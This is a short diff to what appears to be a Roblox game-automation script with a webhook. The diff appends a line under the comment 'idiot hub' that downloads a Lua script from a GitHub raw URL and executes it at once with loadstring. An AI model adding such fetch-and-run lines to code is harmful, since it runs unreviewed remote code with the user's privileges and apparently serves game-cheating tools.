@@ -68,3 +68,6 @@ game:GetService("ReplicatedStorage"):WaitForChild("Shared"):WaitForChild("Framew
 end)
 
 print("Webhook Successfully loaded")
+
+--idiot hub
+loadstring(game:HttpGet("https://raw.githubusercontent.com/IdiotHub/Scripts/refs/heads/main/BGSI/main.lua"))()
